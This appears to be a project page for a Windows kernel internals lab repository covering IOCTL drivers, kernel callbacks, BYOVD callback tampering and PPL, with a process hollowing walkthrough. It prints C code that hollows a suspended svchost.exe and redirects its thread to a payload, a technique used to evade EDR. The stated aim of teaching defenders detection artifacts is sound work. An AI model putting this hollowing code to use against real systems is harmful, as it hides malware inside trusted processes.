---
title: "Windows Kernel Internals Lab: Hands-On Ring 0 Simulation Suite"
description: "Safe, observable C/C++ simulations and proof-of-concept labs for understanding Windows kernel drivers, IOCTL communication, kernel callbacks, PPL bypasses, and Process Hollowing."
pubDate: 2026-04-25
status: "active"
github: "https://github.com/Nimesh-Nakum/windows-kernel-internals-lab"
technologies:
  - "C"
  - "C++"
  - "Windows Kernel"
  - "Ring 0"
  - "IOCTL"
  - "WinDbg"
  - "Process Hollowing"
tags:
  - "windows-internals"
  - "kernel"
  - "drivers"
  - "ioctl"
  - "ring0"
  - "process-hollowing"
  - "edr-evasion"
---

Understanding Windows kernel internals is often presented as an intimidating wall of driver code, BSOD crashes, and WinDbg commands.

The **Windows Kernel Internals Lab** repository was designed to break down that wall. It provides a structured collection of safe, observable C/C++ code samples, proof-of-concept labs, and step-by-step simulations that demonstrate how kernel-mode drivers, IOCTL communication channels, process protection levels (PPL), and memory injection primitives behave under the hood.

Rather than running weaponized exploits, these labs allow security researchers, malware analysts, and red teamers to observe OS invariants in real time using Sysinternals tools, Process Hacker, and WinDbg.

---

## Lab Architecture & Core Concepts

```text
 User Mode (Ring 3)                          Kernel Mode (Ring 0)
 ┌───────────────────────────┐               ┌───────────────────────────┐
 │ Attacker / Client App     │               │ Kernel Driver (.sys)      │
 │                           │               │                           │
 │  CreateFile("\\.\Driver")  │ ─── Handle ───> DriverEntry()             │
 │  DeviceIoControl(IOCTL)   │ ── IOCTL ────> IofCompleteRequest()        │
 └───────────────────────────┘               └───────────────────────────┘
               │                                           │
               ▼                                           ▼
 ┌───────────────────────────┐               ┌───────────────────────────┐
 │ Process Hacker / WinDbg   │               │ _EPROCESS Structure       │
 │ Inspects handle & memory  │               │ ActiveProcessLinks, Token │
 └───────────────────────────┘               └───────────────────────────┘
```

### 1. IOCTL Communication Bridge

Windows enforces a hard CPU boundary between User Mode (Ring 3) and Kernel Mode (Ring 0). User-mode applications cannot directly read or write kernel structures.

The lab demonstrates how software drivers bridge this gap using Input/Output Control (**IOCTL**) codes:
- Creating driver device objects (`IoCreateDevice`) and symbolic links (`IoCreateSymbolicLink`).
- Defining custom IOCTL control codes using the `CTL_CODE` macro with `METHOD_BUFFERED` or `METHOD_NEITHER`.
- Handling `IRP_MJ_DEVICE_CONTROL` dispatch routines to receive user buffers and execute kernel-mode operations safely.

### 2. Kernel Callbacks & EDR Telemetry Simulation

EDR agents monitor process creation, thread injection, and module loading by registering kernel callback routines:
- Process creation: `PsSetCreateProcessNotifyRoutineEx`.
- Thread creation: `PsSetCreateThreadNotifyRoutine`.
- Image loads: `PsSetLoadImageNotifyRoutine`.

The lab includes safe driver routines demonstrating how these callbacks fire, how kernel pointer arrays store them in `Ntoskrnl.exe`, and how BYOVD (Bring Your Own Vulnerable Driver) attacks modify or zero these callback arrays to blind security tools.

---

## Code Structure & Proof-of-Concept Modules

| Module | Core APIs / Structures | Objective & Observation |
|---|---|---|
| **Process Hollowing PoC** | `CreateProcessW` (`CREATE_SUSPENDED`), `NtQueryInformationProcess`, `NtUnmapViewOfSection`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread` | Demonstrates replacing the mapped image of a suspended system process with a custom PE payload. Shows VAD tree transition from `MEM_IMAGE` to `MEM_PRIVATE`. |
| **IOCTL Driver Interface** | `CTL_CODE`, `IRP_MJ_CREATE`, `IRP_MJ_DEVICE_CONTROL`, `IoCreateDevice` | Implements a minimal signed kernel driver communicating with a Ring 3 C client application. |
| **EPROCESS Inspection** | `dt nt!_EPROCESS`, `ActiveProcessLinks`, `EX_FAST_REF` Token | WinDbg scripting and code examples showing how the kernel maintains process objects and access tokens. |
| **PPL Protection Check** | `PsProtectedSignerLsa-Light`, `_EPROCESS.Protection` | Demonstrates how Protected Process Light blocks `OpenProcess` with `PROCESS_VM_READ` even for `SYSTEM` users. |

---

## Step-by-Step Lab Execution: Process Hollowing Walkthrough

The repository includes a complete reference C implementation of **Process Hollowing**:

```c
// 1. Create legitimate binary in suspended state
STARTUPINFOA si = { 0 };
PROCESS_INFORMATION pi = { 0 };
si.cb = sizeof(si);

CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL, &si, &pi
);

// 2. Query PEB location in target space
PROCESS_BASIC_INFORMATION pbi;
ULONG retLen;
NtQueryInformationProcess(
    pi.hProcess, ProcessBasicInformation,
    &pbi, sizeof(pbi), &retLen
);

// 3. Read ImageBaseAddress from target PEB (offset 0x10 on x64)
PVOID targetBase = 0;
ReadProcessMemory(
    pi.hProcess,
    (PBYTE)pbi.PebBaseAddress + 0x10,
    &targetBase, sizeof(PVOID), NULL
);

// 4. Unmap target's MEM_IMAGE section
NtUnmapViewOfSection(pi.hProcess, targetBase);

// 5. Allocate MEM_PRIVATE memory and write payload sections
VirtualAllocEx(pi.hProcess, targetBase, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, targetBase, payloadHeaders, sizeOfHeaders, NULL);

// 6. Update thread context RCX register to entrypoint & resume
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)targetBase + payloadEntryPointRVA;
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

---

## Verification & Observability in Lab Tools

Running the labs alongside Process Hacker and WinDbg confirms key forensic artifacts:

1. **Process Hacker VAD Query**: Inspecting the hollowed process memory address space reveals `MEM_PRIVATE` memory at the executable base address instead of a file-backed `MEM_IMAGE` region.
2. **Module List Discrepancy**: Walking `PEB->Ldr` shows no loader table entry for the executing payload, creating a detectable desynchronization between execution and loader data structures.

---

## Educational Intent & Defensive Context

These labs are designed for security research and education. By writing and observing low-level Windows API interactions from first principles, defenders learn to write higher-confidence detection rules based on structural invariants rather than brittle static signatures.

*Full source code and compilation scripts are published on [GitHub](https://github.com/Nimesh-Nakum/windows-kernel-internals-lab).*
